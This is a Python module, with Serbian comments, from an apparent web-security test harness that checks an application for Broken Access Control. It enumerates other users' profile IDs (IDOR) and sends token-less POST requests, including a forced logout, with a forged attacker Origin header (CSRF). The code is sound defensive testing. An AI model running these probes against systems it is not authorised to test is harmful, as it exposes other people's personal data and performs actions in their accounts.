"""
A01:2025 — Broken Access Control.  Dva propusta u jednom testu:

  1. CSRF — server prihvata state-changing zahtev koji nosi SAMO session
     cookie, bez CSRF tokena i sa LAZNIM (tudjim) Origin zaglavljem.
  2. IDOR — ruta /api/profile/<id> vraca profil BILO KOG korisnika po id-ju,
     bez provere vlasnistva.
"""

import os

try:
    import requests
except ImportError:
    requests = None

NAME = "Kontrola pristupa: CSRF + IDOR (A01)"
DESCRIPTION = "CSRF (zahtev bez tokena, lazni Origin) + IDOR (citanje tudjih profila)."

EMAIL = (os.environ.get("APP_TEST_EMAIL") or os.environ.get("CSRF_TEST_EMAIL") or "").strip()
LOZINKA = os.environ.get("APP_TEST_PASSWORD") or os.environ.get("CSRF_TEST_PASSWORD") or ""

LAZNI_ORIGIN = "https://napadac.example"
OPSEG = range(1, 16)  # id-jevi za IDOR probu


def _maskiraj(e):
    if isinstance(e, str) and "@" in e:
        return e.split("@")[0][:3] + "***@***"
    return e


def run(ctx):
    if requests is None:
        ctx.info("Biblioteka 'requests' nije instalirana (pip install requests).")
        ctx.log(ctx.summary())
        return
    if not EMAIL or not LOZINKA:
        ctx.info("APP_TEST_EMAIL / APP_TEST_PASSWORD nisu postavljeni -> preskacem.")
        ctx.log('  $env:APP_TEST_EMAIL = "test@test.com"')
        ctx.log('  $env:APP_TEST_PASSWORD = "test"')
        ctx.log(ctx.summary())
        return

    baza = ctx.target.rstrip("/")
    s = requests.Session()
    ctx.log(f"Prijava: {EMAIL}  @ {baza}")
    try:
        r = s.post(baza + "/api/auth/login", json={"email": EMAIL, "lozinka": LOZINKA}, timeout=5)
    except requests.RequestException as e:
        ctx.info(f"Aplikacija ne odgovara: {e}")
        ctx.log(ctx.summary())
        return
    if r.status_code != 200:
        ctx.info(f"Prijava nije uspela (HTTP {r.status_code}).")
        ctx.log(ctx.summary())
        return
    ctx.log("")

    #=== IDOR: citanje tudjih profila ===
    ctx.log("--- IDOR: /api/profile/<id> ---")
    try:
        moj_id = s.get(baza + "/api/me", timeout=5).json().get("id")
    except Exception:
        moj_id = None
    tudji = []
    for i in OPSEG:
        try:
            resp = s.get(baza + f"/api/profile/{i}", timeout=5)
        except requests.RequestException:
            continue
        if resp.status_code != 200:
            continue
        try:
            d = resp.json()
        except ValueError:
            continue
        if d.get("id") is not None and d.get("id") != moj_id:
            tudji.append(d)
    if tudji:
        ctx.exposed(f"Procitano {len(tudji)} TUDJIH profila (menjanjem id-ja):")
        for d in tudji[:6]:
            ctx.log(f"   id={d.get('id')}  {d.get('ime')} {d.get('prezime')}  "
                    f"{_maskiraj(d.get('email'))}  tel={d.get('telefon')}")
    else:
        ctx.blocked("Nijedan tudji profil nije dostupan -> kontrola pristupa radi.")
    ctx.log("")

    #=== CSRF: zahtev bez tokena, lazni Origin ===
    ctx.log("--- CSRF: stanje-menjajuci zahtev, lazni Origin, bez tokena ---")
    if any("csrf" in k.lower() for k in s.cookies.keys()):
        ctx.info("Server je izdao CSRF token kolacic.")
    else:
        ctx.exposed("Nema CSRF tokena -> zastita se oslanja samo na session cookie.")
    lazna = {"Origin": LAZNI_ORIGIN, "Referer": LAZNI_ORIGIN + "/napad.html"}

    try:
        unread = s.get(baza + "/api/alerts/unread", timeout=5).json().get("count", 0)
    except Exception:
        unread = 0
    if unread == 0:
        r1 = s.post(baza + "/api/alerts/procitano", headers=lazna, timeout=5)
        ctx.log(f"   POST /api/alerts/procitano  (Origin {LAZNI_ORIGIN})  -> {r1.status_code}")
        if r1.status_code == 200:
            ctx.exposed("Prihvacen zahtev sa tudjeg Origin-a bez tokena.")
        elif r1.status_code == 403:
            ctx.blocked("Odbijeno (403) -> postoji CSRF/Origin zastita.")
    else:
        ctx.info(f"Nalog ima {unread} neprocitanih -> preskacem (da ne menjam podatke).")

    r2 = s.post(baza + "/api/auth/logout", headers=lazna, timeout=5)
    ctx.log(f"   POST /api/auth/logout  (Origin {LAZNI_ORIGIN})  -> {r2.status_code}")
    if r2.status_code == 200:
        ctx.exposed("Prisilna odjava sa tudjeg Origin-a -> CSRF moguc.")
    elif r2.status_code == 403:
        ctx.blocked("Odjava odbijena (403) -> CSRF/Origin zastita.")
    ctx.log("   (prodaja/profil imaju isti propust - namerno se ne salju)")

    ctx.log("")
    ctx.log(ctx.summary())
